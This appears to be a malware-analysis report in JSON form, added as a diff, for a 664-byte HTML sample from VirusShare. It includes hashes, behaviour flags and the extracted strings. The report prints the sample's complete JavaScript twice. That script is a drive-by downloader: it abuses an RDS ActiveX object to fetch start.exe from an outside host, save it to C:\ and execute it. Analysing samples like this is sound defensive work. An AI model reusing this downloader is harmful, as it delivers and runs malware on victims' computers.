@@ -1,0 +1,61 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "SaveToFile": "May create a text file",
+            "Shell": "May run an executable file or a system command",
+            "Shell.Application": "May run an application",
+            "ShellExecute": "May run an executable file or a system command",
+            "Write": "May write to a file",
+            "adodb.stream": "May create a text file",
+            "msxml2.XMLHTTP": "May download files from the Internet",
+            "open": "May open a file"
+        },
+        "macro": "<Script Language=\"JavaScript\">\nvar obj_RDS = document.createElement('object');\nobj_RDS.setAttribute('id','obj_RDS');\nobj_RDS.setAttribute('classid','clsid:BD96C556-65A3-11D0-983A-00C04FC29E36');\ntry\n{\nvar obj_msxml2 = obj_RDS.CreateObject(\"msxml2.XMLHTTP\",\"\");\nobj_msxml2.open(\"GET\",\"http://dnv-counter.com/trf/start.exe\",false);\nobj_msxml2.send();\nvar obj_ShellApp = obj_RDS.CreateObject(\"Shell.Application\",\"\");\nvar obj_adodb = obj_RDS.CreateObject(\"adodb.stream\",\"\");\nobj_adodb.type = 1;\nobj_adodb.open();\nobj_adodb.Write(obj_msxml2.responseBody);\nvar fn = \"C:\\\\23100247.exe\";\nobj_adodb.SaveToFile(fn,2);\nobj_ShellApp.ShellExecute(fn);\n}\ncatch(e){} \n</Script> "
+    },
+    "filename": "VirusShare_2faccfdf19e1c02b8d83d1e231e82d33",
+    "filesize": 664,
+    "filetype": "HTML document, ASCII text",
+    "hashes": {
+        "md5": "2faccfdf19e1c02b8d83d1e231e82d33",
+        "sha1": "8fc47a00911c8d0288d8e24323f18e7204e6a3fd",
+        "sha256": "c7dc1372173d0c1af0672b5da5a90033f2e340c1bb13b9785d9d6b04bb577817"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<Script Language=\"JavaScript\">",
+            "var obj_RDS = document.createElement('object');",
+            "obj_RDS.setAttribute('id','obj_RDS');",
+            "obj_RDS.setAttribute('classid','clsid:BD96C556-65A3-11D0-983A-00C04FC29E36');",
+            "var obj_msxml2 = obj_RDS.CreateObject(\"msxml2.XMLHTTP\",\"\");",
+            "obj_msxml2.open(\"GET\",\"http://dnv-counter.com/trf/start.exe\",false);",
+            "obj_msxml2.send();",
+            "var obj_ShellApp = obj_RDS.CreateObject(\"Shell.Application\",\"\");",
+            "var obj_adodb = obj_RDS.CreateObject(\"adodb.stream\",\"\");",
+            "obj_adodb.type = 1;",
+            "obj_adodb.open();",
+            "obj_adodb.Write(obj_msxml2.responseBody);",
+            "var fn = \"C:\\\\23100247.exe\";",
+            "obj_adodb.SaveToFile(fn,2);",
+            "obj_ShellApp.ShellExecute(fn);",
+            "catch(e){} ",
+            "</Script> "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://dnv-counter.com/trf/start.exe"
+        ]
+    },
+    "time": "0:00:00.293154",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
